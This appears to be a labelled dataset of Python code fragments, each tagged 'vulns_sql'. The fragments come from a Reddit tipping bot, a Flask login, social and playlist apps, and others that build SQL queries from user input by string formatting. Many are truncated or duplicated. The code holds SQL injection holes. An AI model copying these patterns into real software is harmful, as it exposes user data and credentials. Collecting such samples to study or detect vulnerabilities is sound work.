(recipient_username, amount)def handle_receive(message):    message_time = datetime.utcfromtimestamp(message.created_utc)    username = str(message.author)    mycursor.execute(""SELECT address, private_key FROM accounts WHERE username='%s'"" % username)    result = mycursor.fetchall()    if len(result) > 0:        open_or_receive(result[0][0], result[0][1])        balance = check_balance(result[0][0])        add_history_record(            username=username,            action='receive',            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),            address=result[0][0],            comment_or_message='message'        )        response = ""You currently have %s Nano available, and %s Nano unpocketed. To pocket any, create a new "" \                   ""message containing the word 'receive' in the body"" % (balance[0] / 10 ** 30, balance[1] / 10 ** 30)        message.reply(response)    else:        add_history_record(            username=username,            action='receive',            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),            comment_or_message='message'        )        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""        message.reply(response)def handle_minimum(message):    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    username = str(message.author)    parsed_text = message.body.replace('\\', '').split('\n')[0].split(' ')    if len(parsed_text) < 2:        response = ""I couldn't parse your command. I was expecting 'minimum <amount>'. Be sure to check your spacing.""        message.reply(response)        return None    if parsed_text[1].lower() == 'nan' or ('inf' in parsed_text[1].lower()):        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""        message.reply(response)    try:        amount = float(parsed_text[1])    except:        response = ""'%s' didn't look like a number to me. If it is blank, there might be extra spaces in the command.""        message.reply(response)    if nano_to_raw(amount) < nano_to_raw(0.01):        response = ""The overall tip minimum is 0.01 Nano.""        message.reply(response)    sql = ""SELECT address FROM accounts WHERE username=%s""    val = (username, )    mycursor.execute(sql, val)    result = mycursor.fetchall()    print(result)    if len(result) > 0:        add_history_record(            username=username,            action='minimum',            amount=nano_to_raw(amount),            address=result[0][0],            comment_or_message='message',            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),            comment_text=str(message.body)[:255]        )        sql = ""UPDATE accounts SET minimum = %s WHERE username = %s""        print(amount)        print(nano_to_raw(amount))        val = (str(nano_to_raw(amount)), username)        print(val)        mycursor.execute(sql, val)        mydb.commit()        response = ""Updating tip minimum to %s""%amount        message.reply(response)    else:        add_history_record(            username=username,            action='minimum',            reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S'),            amount=nano_to_raw(amount),            comment_text=str(message.body)[:255]        )        response = ""You do not currently have an account open. To create one, respond with the text 'create' in the message body.""        message.reply(response)def handle_help(message):    message_time = datetime.utcfromtimestamp(message.created_utc)  # time the reddit message was created    add_history_record(        username=str(message.author),        action='help',        comment_or_message='message',        reddit_time=message_time.strftime('%Y-%m-%d %H:%M:%S')        )    response = help_text    message.reply(response)def handle_comment(message):    if message.body[0] == ' ':        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')    else:        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')    print(parsed_text)    print(len(parsed_text))    response = handle_send_nano(message, parsed_text, 'comment')    message.reply(response + comment_footer)def handle_message(message):    message_body = str(message.body).lower()    print(""Body: **"", message_body, ""**"")    if message.body[0] == ' ':        parsed_text = str(message.body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')    else:        parsed_text = str(message.body).lower().replace('\\', '').split('\n')[0].split(' ')    print(""Parsed Text:"", parsed_text)    if parsed_text[0].lower() == 'help':        print(""Helping"")        handle_help(message)    elif parsed_text[0].lower() == 'minimum':        print(""Setting Minimum"")        handle_minimum(message)    elif parsed_text[0].lower() == 'create':        print(""Creating"")        handle_create(message)    elif parsed_text[0].lower() == 'private_key':        print(""private_keying"")    elif parsed_text[0].lower() == 'new_address':        print(""new address"")    elif parsed_text[0].lower() == 'send':        print(""send via PM"")        handle_send(message)    elif parsed_text[0].lower() == 'receive':        print(""receive"")        handle_receive(message)    elif parsed_text[0].lower() == 'balance':        print(""balance"")        handle_balance(message)    else:        add_history_record(            username=str(message.author),            comment_text=str(message.body)[:255],            comment_or_message='message',        )for action_item in stream_comments_messages():    if action_item is None:        pass    elif action_item[0] == 'comment':        print(time.strftime('%Y-%m-%d %H:%M:%S'))        print('Comment: ', action_item[1].author, action_item[1].body[:20])        if action_item[1].body[0]==' ':            parsed_text = str(action_item[1].body[1:]).lower().replace('\\', '').split('\n')[0].split(' ')        else:            parsed_text = str(action_item[1].body).lower().replace('\\', '').split('\n')[0].split(' ')        print('Parsed comment: ', parsed_text)        if parsed_text[0] == r'!nano_tip':            print('\n')            print('*****************************************************')            print('found an item.')            handle_comment(action_item[1])    elif action_item[0] == 'message':        if action_item[1].author == 'nano_tipper_z':            pass        else:            print(time.strftime('%Y-%m-%d %H:%M:%S'))            print('A new message was found %s, sent by %s.'%(action_item[1], action_item[1].author ))            handle_message(action_item[1])",vulns_sql
"        ""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES('{playlist_id}', '{title}', '{thumbnail}', '{position}');"".format(            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))",vulns_sql
"        ""INSERT INTO playlist (name, video_position) VALUES('{name}', 0);"".format(name=name))",vulns_sql
"        ""SELECT id, name, video_position from playlist WHERE id={id};"".format(id=id))    db.execute(""DELETE FROM playlist where id={id};"".format(id=id))    db.execute(        ""UPDATE playlist SET name='{name}' WHERE id={id};"".format(name=name, id=id))    db.execute(        ""UPDATE playlist SET video_position='{position}' WHERE id={id};"".format(position=position, id=id))        ""INSERT INTO playlist (name, video_position) VALUES('{name}', 0);"".format(name=name))",vulns_sql
"    db.execute(""SELECT id, title, thumbnail, position from video WHERE playlist_id={playlist_id} ORDER BY position ASC;"".format(        playlist_id=playlist_id))",vulns_sql
"    db.execute(""SELECT id, position from video WHERE id={id} and playlist_id={playlist_id};"".format(        id=id, playlist_id=playlist_id))    db.execute(""SELECT max(position) as position from video WHERE playlist_id={playlist_id};"".format(        playlist_id=playlist_id))    db.execute(""DELETE FROM video where id={id};"".format(id=id))    db.execute(""DELETE FROM video where playlist_id={playlist_id};"".format(        playlist_id=playlist_id))    db.execute(        ""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES({playlist_id}, '{title}', '{thumbnail}', {position});"".format(            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))    db.execute(""UPDATE video SET position = position - 1 WHERE position > {removed_position}"".format(        removed_position=removed_position))    db.execute(""UPDATE video SET position = Case position When {position} Then {next_position} Else position + 1 End WHERE position BETWEEN {next_position} AND {position};"".format(        position=position, next_position=next_position))",vulns_sql
"    inserted = (list_id, cook_id, food_name, price, loc, image)    sql = ""INSERT INTO {} VALUES {}"".format(listing_table_name, str(inserted).encode(""ascii"", ""replace""))    cur.execute(sql)",vulns_sql
"        sql = ""INSERT INTO {} VALUES {}"".format(listing_tags_table_name, str((listing_id, x)))        cur.execute(sql)",vulns_sql
"				WINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';"".\				og_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\				surl = short_url)		res_update = cursor.execute(counter_sql)",vulns_sql
"            word = (targetWord.lower(),1)            self.cursor.execute(sqlFormula, word)",vulns_sql
"def game_query_builder(key, value, query):        query (str): SQL query.    d = {'id': ""id in ({value})"",         'name': ""name LIKE '{value}%'"",         'rating-min': 'bgg_rating>={value}',         'players-from': 'min_players<={value}',         'players-to': 'max_players>={value}',         'time-from': 'max_playtime>={value}',         'time-to': 'min_playtime<={value}',         'weight-min': 'weight>={value}',         'weight-max': 'weight<={value}',        return query    elif key == 'id' and 'id in' in query:        return query[:pos] + ', ' + value + query[pos:]        return query + d[key].format(value=value) + ' AND '",vulns_sql
"            query = game_query_builder(key, value, query)            games = Game.query.filter(sqlalchemy.text(query)).all()            games = (Game.query.filter(sqlalchemy.text(query)).filter(                Game.categories.any(GameCategory.id == game_category)).all())",vulns_sql
"        query = game_query_builder(key, value, query)        attr_games = Game.query.filter(sqlalchemy.text(query)).all()        attr_games = (Game.query.filter(sqlalchemy.text(query)).filter(            Game.categories.any(GameCategory.id.in_(categories))).all())",vulns_sql
"    cur.execute(""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"",                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))",vulns_sql
"    cur.execute(""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"")",vulns_sql
    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid),vulns_sql
"        username = request.form['username'] # FIXME SQL_injection danger?        result = cur.execute(""SELECT * FROM Users WHERE username = %s"", [username])            data = cur.fetchone() # FIXME fucking stupid username is not primary key",vulns_sql
"        result = cur.execute(""DELETE FROM Crawls WHERE cid = %s"" % cid)",vulns_sql
"    result = cur.execute(""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"")",vulns_sql
"    cur.execute(""INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)"",                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))",vulns_sql
"    cur.execute(""SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)"")",vulns_sql
    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid),vulns_sql
"        username = request.form['username'] # FIXME SQL_injection danger?        result = cur.execute(""SELECT * FROM Users WHERE username = %s"", [username])            data = cur.fetchone() # FIXME fucking stupid username is not primary key",vulns_sql
"        result = cur.execute(""DELETE FROM Crawls WHERE cid = %s"" % cid)",vulns_sql
"    result = cur.execute(""SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls"")",vulns_sql
"            query=""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
	connection = self.connect(),vulns_sql
"			query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data) #i didn't understand this '.format(data)'				cursor.execute(query)		connection.connect(self):",vulns_sql
"        cursor.execute(""UPDATE cdr SET recordingfile='{}."".format(name) + file_format + ""'"" + "" WHERE uniqueid='{}'"".format(unique_id))",vulns_sql
"ANSIBLE_METADATA = {'status': ['stableinterface'],                    'supported_by': 'community',                    'version': '1.0'}DOCUMENTATION = '''---module: postgresql_settingshort_description: manage config settings for PostgreSQL instance.description:  - Change server configuration parameters across the entire database cluster  - New values will be effective after the next server configuration reload,    or after the next server restart in the case of parameters that can only    be changed at server start  - Only superusers can change configuration settingsauthor: ""Kostiantyn Nemchenko (@kostiantyn-nemchenko)""version_added: ""2.3""requirements:  - psycopg2options:  login_user:    description:      - The username used to authenticate with    required: false    default: null  login_password:    description:      - The password used to authenticate with    required: false    default: null  login_host:    description:      - Host running the database    required: false    default: localhost  login_unix_socket:    description:      - Path to a Unix domain socket for local connections    required: false    default: null  port:    description:      - Database port to connect to.    required: false    default: 5432  option:    description:      - The parameter from PostgreSQL configuration file    required: true    default: null  value:    description:      - The value of the parameter to change    required: false    default: null  state:    description:      - The parameter state    required: false    default: present    choices: [ ""present"", ""absent"" ]'''EXAMPLES = '''- postgresql_setting:    option: work_mem    value: 8MB    state: present- postgresql_setting:    option: listen_addresses    state: absent- postgresql_setting:    option: autovacuum    value: on'''try:    import psycopg2    import psycopg2.extrasexcept ImportError:    postgresqldb_found = Falseelse:    postgresqldb_found = Truefrom ansible.module_utils.six import iteritemsclass NotSupportedError(Exception):    passdef option_ispreset(cursor, option):    """"""Check if option is a preset parameter    https://www.postgresql.org/docs/current/static/runtime-config-preset.html    """"""    query = """"""    SELECT EXISTS        (SELECT 1         FROM pg_settings         WHERE context = 'internal'           AND name = '%s')    """"""    cursor.execute(query % option)    return cursor.fetchone()[0]def option_get_default_value(cursor, option):    """"""Get parameter value assumed at server startup""""""    query = """"""    SELECT boot_val    FROM pg_settings    WHERE name = '%s'    """"""    cursor.execute(query % option)    return cursor.fetchone()[0]def option_isdefault(cursor, option):    """"""Whether the parameter has not been changed since the last database start or    configuration reload""""""    query = """"""    SELECT boot_val,           reset_val    FROM pg_settings    WHERE name = '%s'    """"""    cursor.execute(query % option)    rows = cursor.fetchone()    if cursor.rowcount > 0:        default_value, current_value = rows[0], rows[1]        return default_value == current_value    else:        return Falsedef option_exists(cursor, option):    """"""Check if such parameter exists""""""    query = """"""    SELECT name    FROM pg_settings    WHERE name = '%s'    """"""    cursor.execute(query % option)    return cursor.rowcount > 0def option_reset(cursor, option):    """"""Reset parameter if it has non-default value""""""    if not option_isdefault(cursor, option):        query = ""ALTER SYSTEM SET %s TO '%s'""        cursor.execute(query % (option,                                option_get_default_value(cursor, option)))        return True    else:        return Falsedef option_set(cursor, option, value):    """"""Set new value for parameter""""""    if not option_matches(cursor, option, value):        query = ""ALTER SYSTEM SET %s TO '%s'""        cursor.execute(query % (option, value))        return True    else:        return Falsedef option_matches(cursor, option, value):    """"""Check if setting matches the specified value""""""    query = ""SELECT current_setting('%s') = '%s'""    cursor.execute(query % (option, value))    return cursor.fetchone()[0]def main():    module = AnsibleModule(        argument_spec=dict(            login_user=dict(default=""postgres""),            login_password=dict(default="""", no_log=True),            login_host=dict(default=""""),            login_unix_socket=dict(default=""""),            port=dict(default=""5432""),            option=dict(required=True,                        aliases=['name', 'setting', 'guc', 'parameter']),            value=dict(default=""""),            state=dict(default=""present"", choices=[""absent"", ""present""]),        ),        supports_check_mode=True    )    if not postgresqldb_found:        module.fail_json(msg=""the python psycopg2 module is required"")    option = module.params[""option""]    value = module.params[""value""]    port = module.params[""port""]    state = module.params[""state""]    changed = False    params_map = {        ""login_host"": ""host"",        ""login_user"": ""user"",        ""login_password"": ""password"",        ""port"": ""port""    }    kw = dict((params_map[k], v) for (k, v) in iteritems(module.params)              if k in params_map and v != '')    if ""host"" not in kw or kw[""host""] == """" or kw[""host""] == ""localhost"":        is_localhost = True    else:        is_localhost = False    if is_localhost and module.params[""login_unix_socket""] != """":        kw[""host""] = module.params[""login_unix_socket""]    try:        db_connection = psycopg2.connect(database=""postgres"", **kw)        if psycopg2.__version__ >= '2.4.2':            db_connection.autocommit = True        else:            db_connection.set_isolation_level(psycopg2                                              .extensions                                              .ISOLATION_LEVEL_AUTOCOMMIT)        cursor = db_connection.cursor(            cursor_factory=psycopg2.extras.DictCursor)    except Exception:        e = get_exception()        module.fail_json(msg=""unable to connect to database: %s"" % e)    try:        if option_ispreset(cursor, option):            module.warn(                ""Option %s is preset, so it can only be set at initdb ""                ""or before building from source code. For details, see ""                ""postgresql.org/docs/current/static/runtime-config-preset.html""                % option            )        elif option_exists(cursor, option):            if module.check_mode:                if state == ""absent"":                    changed = not option_isdefault(cursor, option)                elif state == ""present"":                    changed = not option_matches(cursor, option, value)                module.exit_json(changed=changed, option=option)            if state == ""absent"":                try:                    changed = option_reset(cursor, option)                except SQLParseError:                    e = get_exception()                    module.fail_json(msg=str(e))            elif state == ""present"":                try:                    changed = option_set(cursor, option, value)                except SQLParseError:                    e = get_exception()                    module.fail_json(msg=str(e))        else:            module.warn(""Option %s does not exist"" % option)    except NotSupportedError:        e = get_exception()        module.fail_json(msg=str(e))    except SystemExit:        raise    except Exception:        e = get_exception()        module.fail_json(msg=""Database query failed: %s"" % e)    module.exit_json(changed=changed, option=option)from ansible.module_utils.basic import *from ansible.module_utils.database import *if __name__ == '__main__':    main()",vulns_sql
"  cursor.execute(""insert into posts values ('%s')"" % content)",vulns_sql
"			LOG=""INSERT INTO LOGS (HUMIDITY,TEMPERATURE,PRESSURE,AIR_QUALITY,READING_TIME,LOG_TIME,BASE_STATION_ID)	VALUES(""+str(values[1])+"",""+str(values[2])+"",""+str(values[3])+"",""+str(values[4])+"",('%s'),('%s'),1);"" % (datetime.now(),datetime.now(),)			write_to_db(LOG)def write_to_db(LOG):		con.cursor().execute(LOG)",vulns_sql
"def get_top_articles(cur, order, limit):",vulns_sql
"        order(str): The order to view the rows in.            WHERE log.path LIKE '%'||articles.slug AND            ORDER BY views {}            LIMIT {}'''.format(order, limit)    rows = get_data(cur, query)",vulns_sql
"def get_top_authors(cur, order):        order(str): The order to view the rows in.            log.path LIKE '%'||articles.slug AND            ORDER BY views {}'''.format(order)    rows = get_data(cur, query)",vulns_sql
"            / log_requests.total::numeric > {}            ORDER BY log_errors.date'''.format(error_percent)    rows = get_data(cur, query)",vulns_sql
"def get_data(cur, query):        cur.execute(query)    except psycopg2.Error:",vulns_sql
"        if get_top_articles(cur, ""DESC"", 3):        if get_top_authors(cur, ""DESC""):",vulns_sql
main(),vulns_sql
"    def _executeSQL(self, cur, sql):            cur.execute(sql)",vulns_sql
"    def _executeSQL(self, cur, sql):            cur.execute(sql)",vulns_sql
"            clauses='', isDeep=True, refreshAttrs=True, serialNum=None):",vulns_sql
"                    subklass, clauses, isDeep, refreshAttrs, serialNum))",vulns_sql
"            conn, cur = self.executeSQL(fetchSQLStart + clauses + ';')",vulns_sql
"    def executeSQL(self, sql, connection=None, commit=False):",vulns_sql
"        self._executeSQL(cur, sql)    def _executeSQL(self, cur, sql):        cur.execute(sql)",vulns_sql
"    def _executeSQL(self, cur, sql):            cur.execute(sql)",vulns_sql
"        table_name = (symbol + '_' + interval, )            cur.execute(""SELECT name FROM sqlite_master WHERE type='table' AND name=?"", table_name)",vulns_sql
"                cur.execute('CREATE TABLE {}_{}('.format(symbol, interval) +",vulns_sql
"                    cur.execute('INSERT INTO {}_{} '.format(symbol, interval) +                                'VALUES({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {})'.format(output[x][0],                                                                                            output[x][1],                                                                                            output[x][2],                                                                                            output[x][3],                                                                                            output[x][4],                                                                                            output[x][5],                                                                                            output[x][6],                                                                                            output[x][7],                                                                                            output[x][8],                                                                                            output[x][9],                                                                                            output[x][10]))                print('Symbol {}, interval {}: Historical data has been downloaded and saved to database'.format(symbol, interval))            print('Symbol {}, interval {}: Table already exists in database. No data has been downloaded.'.format(symbol, interval))",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
"  page_name = '{0}_{1}'.format(page_id, page_id)",vulns_sql
"    print 'sanitized_page_name: {0}'.format(sanitized_page_name)    query = 'SELECT id FROM pages WHERE name=""{0}""'.format(sanitized_page_name)    self.cursor.execute(query)",vulns_sql
"    query = 'SELECT name FROM pages WHERE id=""{0}""'.format(page_id)    self.cursor.execute(query)",vulns_sql
"    query = 'SELECT to_id FROM redirects WHERE from_id=""{0}""'.format(from_page_id)    self.cursor.execute(query)",vulns_sql
"    query = 'SELECT from_id, to_id FROM links WHERE {0} IN {1}'.format(to_id_or_from_id, page_ids)",vulns_sql
"from flask_mysqldb import MySQLfrom forms import registerForm, loginFormfrom urllib.parse import urlparse, urljoinALLOWED_EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'])",vulns_sql
mysql = MySQL(app),vulns_sql
"	conn = mysql.connection	cur = conn.cursor()	cur.execute(""""""SELECT subject_id, subject_name FROM subjects WHERE 1 ORDER BY subject_id ASC"""""")	rv = cur.fetchall()	return render_template('home.html', subjects=rv)	if request.method == ""POST"":		if 'file' not in request.files:			flash('No selected items')			return ""Err""		file = request.files['file']		if file.filename == '':			flash('No file selected')			return ""Err""		if file and allowed_file(file.filename):			filename = secure_filename(file.filename)			file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))			return redirect(url_for('uploaded_file',												filename=filename))		return send_from_directory(app.config['UPLOAD_FOLDER'],								filename)	return render_template('about.html')",vulns_sql
"	form = registerForm(request.form)	if request.method == 'POST' and form.validate():		conn = mysql.connection		cur = conn.cursor()		username = form.username.data		first_name = form.firstname.data		last_name = form.lastname.data		email = form.email.data		password = sha256_crypt.hash(form.password.data)		rv = cur.execute(""""""INSERT INTO users (first_name, last_name, username, password, email) VALUES (%s, %s, %s, %s, %s)"""""", (first_name, last_name, username, password, email ))		conn.commit()		if str(rv):			return redirect(url_for('login'))	else:		return render_template('register.html', form=form)	form = loginForm(request.form)	if request.method == 'POST' and form.validate():		conn = mysql.connection		cur = conn.cursor()		cur.execute(""""""SELECT id, password FROM users WHERE username=""%s"" """""" % str(form.username.data) )		rv = cur.fetchall()		if sha256_crypt.verify(form.password.data, str(rv[0]['password'])):			user = User(rv[0]['id'])			user.authenticate(form.username.data)			login_user(user)		else:			return ""Wrong password""		flash('Logged in successfully.')		next = request.args.get('next')		if not is_safe_url(next):			return abort(400)		return redirect(next or url_for('home'))	else:		return render_template('login.html', form=form)",vulns_sql
"	return send_from_directory('css',	return send_from_directory('js',",vulns_sql
"		return '.' in filename and \		filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS	def __init__(self, uid):		self.is_authenticated = False		self.is_active = False		self.is_anonymous = True		self.username = None		self.user_id = uid	def __repr__(self):		return ""%d/%s"" % (self.user_id, self.username)	def get_id(self):		conn = mysql.connection		cur = conn.cursor()		cur.execute(""""""SELECT id FROM users WHERE username=""%s"" """""" % self.username)		rv = cur.fetchall()		return str(rv[0]['id'])	def authenticate(self, username):		self.is_authenticated = True		self.is_active = True		self.is_anonymous = False		self.username = username	def setUsername(self, username):		self.username = username	def get(user_id):		return self	def returnUsername(self):		return self.username	app.run(debug=True)",vulns_sql
"  c.execute(""insert into posts values('%s')"" % content)",vulns_sql
"        column_names = [""cve.id"", ""redhat_url"", ""secondary_url"", ""cve.name"", ""severity.name"", ""published_date"",                        ""modified_date"", ""iava"", ""description""]        cve_query = ""SELECT %s from cve"" % ', '.join(column for column in column_names)        cve_query = cve_query + "" LEFT JOIN severity ON severity_id = severity.id""        cve_query = cve_query + "" WHERE cve.name IN %s""",vulns_sql
"        query = ""SELECT cve_id, cwe.name, cwe.link FROM cve_cwe map JOIN cwe ON map.cwe_id = cwe.id WHERE map.cve_id IN %s""",vulns_sql
"        cve_query = ""SELECT name FROM cve""        cve_query += "" JOIN errata_cve ON cve_id = cve.id""        cve_query += "" WHERE errata_cve.errata_id = %s"" % str(id)        self.cursor.execute(cve_query)",vulns_sql
"        pkg_query = ""SELECT package.name, evr.epoch, evr.version, evr.release, arch.name""        pkg_query += "" FROM pkg_errata""        pkg_query += "" JOIN package ON package.id = pkg_errata.pkg_id""        pkg_query += "" JOIN evr ON evr.id = package.evr_id""        pkg_query += "" JOIN arch ON arch.id = package.arch_id""        pkg_query += "" WHERE pkg_errata.errata_id = %s"" % str(id)        self.cursor.execute(pkg_query)",vulns_sql
"        errata_query = ""SELECT errata.id, errata.name, synopsis, severity.name, description,""        errata_query += "" solution, issued, updated""        errata_query += "" FROM errata""        errata_query += "" LEFT JOIN severity ON severity_id = severity.id""        errata_query += "" WHERE errata.name IN %s""",vulns_sql
"                sql = """"""                select package.id from package join evr on package.evr_id = evr.id where package.id in %s and evr.evr > (select evr from evr where id = %s);                """""" % ('%s', str(auxiliary_dict[pkg]['evr_id']))                self.cursor.execute(sql, [tuple(auxiliary_dict[pkg][n])])",vulns_sql
from application.help import getArticlesWithCondition,vulns_sql
    articles_writing = user.get_articles_writing()    articles_editing = user.get_articles_editing(),vulns_sql
"  c.execute(""insert into posts values('%s')"" % content)",vulns_sql
"    query = ""SELECT DISTINCT * FROM samwisedb.Event WHERE user = \"""" + userid + ""\"";""    cursor.execute(query)    return json.dumps(data)",vulns_sql
"            query = ""DELETE FROM samwisedb.Event WHERE eventId = \"""" + eventId + ""\"";""            print(query)            cursor.execute(query)    return json.dumps([])",vulns_sql
"            query = ""insert into samwisedb.Event(user, eventName, startTime, endTime, tagId) values (\"""" + user + ""\"", \"""" + eventName + ""\"", \"""" + startTime + ""\"", \"""" + endTime + ""\"", \"""" + tagId + ""\"");""            print(query)            cursor.execute(query)    return json.dumps([event_id])",vulns_sql
"            cursor.execute(""""""               UPDATE samwisedb.Event               SET eventName=%s, startTime=%s, endTime=%s, tagId=%s               WHERE eventId=%s            """""", (eventName, startTime, endTime, tagId, eventId))    return json.dumps([])",vulns_sql
    return json.dumps([]),vulns_sql
"            query = ""INSERT into samwisedb.Task(user, taskName, courseId, dueDate, details) values (\"""" + userid + ""\"", \"""" + taskname + ""\"", \"""" + course + ""\"", \"""" + duedate + ""\"", \"""" + details + ""\"");""            print(query)            cursor.execute(query)    return json.dumps([task_id])",vulns_sql
    return json.dumps([]),vulns_sql
    return json.dumps(data),vulns_sql
"    def  __init__ (self, cache_dir='cache', expires=timedelta(days=30), compress=True):",vulns_sql
"        sqlText=""select comment from comments order by date desc where userid=%d""%(userid)        result=sql.queryDB(self.conn,sqlText)        sqlText=""select (select Count(*) from comment_like where comments.commentid = comment_like.commentid) as like,(select Count(*) from comment_like where comments.commentid = comment_like.commentid and comment_like.userid=%d) as flag,commentid,name,comment from users,comments where users.userid=comments.userid and postid=%d order by date desc;""%(userid,postid)        result=sql.queryDB(self.conn,sqlText)        sqlText=""select userid from comment_like where commentid=%d""%(commentid)        result=sql.queryDB(self.conn,sqlText)        sqlText=""insert into comments(comment,userid,date,postid) values('%s',%d,current_timestamp(0),%d);""%(comment,userid,postid)        result=sql.insertDB(self.conn,sqlText)        sqlText=""delete from comments where commentid=%d""%(commentid)        result=sql.deleteDB(self.conn,sqlText)        sqlText=""insert into comment_like values(%d,%d);""%(userid,commentid)        result=sql.insertDB(self.conn,sqlText)        sqlText=""delete from comment_like where commentid=%d and userid=%d;""%(commentid,userid)        result=sql.deleteDB(self.conn,sqlText)",vulns_sql
"                and post_like.userid=%d) as flag from users,post \                (select friendid from friends where userid =%d) or post.userid=%d )\                order by post.date desc;""%(userid,userid,userid)        result=sql.queryDB(self.conn,sqlText)                users.userid=post.userid and post.postid=%d""%(postid)        result=sql.queryDB(self.conn,sqlText)        sqlText=""select userid from post_like where postid=%d""%(postid)        result=sql.queryDB(self.conn,sqlText)        sqlText=""insert into post_like values(%d,%d);""%(postid,userid)        result=sql.insertDB(self.conn,sqlText)        sqlText=""delete from post_like where postid=%d and userid=%d;""%(postid,userid)        result=sql.deleteDB(self.conn,sqlText)                values(%d,current_timestamp(0),'%s');""%(userid,post);        result=sql.insertDB(self.conn,sqlText)        sqlText=""delete from post where post.postid=%d""%(postid)        result=sql.deleteDB(self.conn,sqlText)",vulns_sql
"def queryDB(conn,sql_select):    cur.execute(sql_select)    rows=cur.fetchall()    return rowsdef insertDB(conn,sql_insert):    result=cur.execute(sql_insert)    conn.commit()    print(""insert data successfull"")    return resultdef deleteDB(conn,sql_delete):    result=cur.execute(sql_delete)    conn.commit()    print(""delete data successfull"")    return resultdef updateDB(conn,sql_update):    result=cur.execute(sql_update)    conn.commit()    print(""update data successfull"")    return result",vulns_sql
"        sqlName=""select count(*) from users where name='%s' and \                password='%s';""%(self.name,self.password)        checkName=sql.queryDB(self.conn,sqlName)",vulns_sql
"        t_sql_insert=""insert into \                values('{name}','{psw}','{email}','{country}',current_timestamp(0));""        sql_insert=t_sql_insert.format(name=self.name,psw=self.password,\                email=self.email,country=self.country)        sqlName=""select count(*) from users where name='%s';""%(self.name)        checkName=sql.queryDB(self.conn,sqlName)            sql.insertDB(self.conn,sql_insert)        sqlName=""select userid from users where name='%s';""%(self.name)        userid=sql.queryDB(self.conn,sqlName)        sqlText=""select comment from post where userid=%d order by date;""        allposts=sql.queryDB(self.conn,sqlText)        sqlText=""select comment from comments where userid=%d order by date;""        allposts=sql.queryDB(self.conn,sqlText)        sqlText=""select name,password,email,country from users where userid=%d;""%(userid)        information=sql.queryDB(self.conn,sqlText)                set name='%s',password='%s',email='%s',country='%s' \                where userid='%d';""%(self.name,self.password,self.email,self.country,userid)            sqlName=""select count(*) from users where name='%s';""%(self.name)            checkName=sql.queryDB(self.conn,sqlName)                sql.updateDB(self.conn,sqlText)            sql.updateDB(self.conn,sqlText)        sqlText=""insert into friends values(%d,%d);""%(friendid,userid)        result=sql.insertDB(self.conn,sqlText)        sqlText=""delete from friends where userid=%d and friendid=%d;""%(userid,friendid)        result=sql.deleteDB(self.conn,sqlText)                where users.userid=friends.friendid and friends.userid=%d) as follow \                from users;""%(userid)        result=sql.queryDB(self.conn,sqlText)                where users.userid=friends.friendid and friends.userid=%d) as follow \                from users where users.name='%s';""%(userid,username)        result=sql.queryDB(self.conn,sqlText)",vulns_sql
"    sql = '''SELECT id, name_enus FROM tblDBCItem WHERE id = {} AND auctionable = true;'''.format(item_id)    cursor.execute(sql)",vulns_sql
"    item_name = request.args.get('name')    sql = '''SELECT id, name_enus FROM `tblDBCItem` WHERE name_enus LIKE ""%{}%"" '''.format(item_name)    cursor = mysql.connection.cursor()    cursor.execute(sql)    data = cursor.fetchall()",vulns_sql
import bleach,vulns_sql
"    c.execute(""INSERT INTO players (name) values (%s)"", (bleach.clean(name),))",vulns_sql
"    safe_n = name = name.translate(None, '\'\""')    query = ""INSERT INTO players (name) values ('{name}')"".format(name=safe_n)    c.execute(query)",vulns_sql
"    statement = ""INSERT INTO matches values ({w}, {l})"".format(w=w, l=l)    c.execute(statement)",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
